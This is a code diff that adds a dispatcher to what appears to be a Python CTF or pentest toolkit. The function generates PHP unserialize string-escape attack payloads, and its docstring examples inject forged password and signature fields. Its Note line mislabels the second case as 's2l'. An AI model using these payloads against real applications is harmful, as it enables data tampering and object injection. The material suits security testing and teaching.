@@ -556,6 +556,42 @@ def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     return header + data
 
 
+def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+    """Use for generate php unserialize escape attack payload, will decide to call l2s or s2l according to the length of src and dst
+
+    Args:
+        src (str): search string
+        dst (str): replace string, this length cannot be the same as src
+        payload (str):  the php serialize data you want to insert
+        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+
+    Returns:
+        s2l:
+            dict:
+                insert_data: The payload that caused the data modification
+        l2s:
+            dict:
+                populoate_data: Data used to fill, causing characters to escape
+                trash_data: To fix the length error
+                insert_data: The payload that caused the data modification
+
+    Example:
+        php_serialize_escape("x", "yy", '''s:8:"password";s:6:"123456"''')
+        php_serialize_escape("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')
+
+    Note:
+        s2l if length of src shorter than length of dst
+        s2l if length of src greater than length of dst
+    """
+    diff_len = len(dst) - len(src)
+    if diff_len > 0:
+        return php_serialize_escape_s2l(src, dst, payload, paddingTrush)
+    elif diff_len < 0:
+        return php_serialize_escape_l2s(src, dst, payload, paddingTrush)
+    else:
+        raise GeneratePayloadError("The length of dst cannot be the same as src")
+
+
 def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
     """
     Use for generate short to long php unserialize escape attack payload
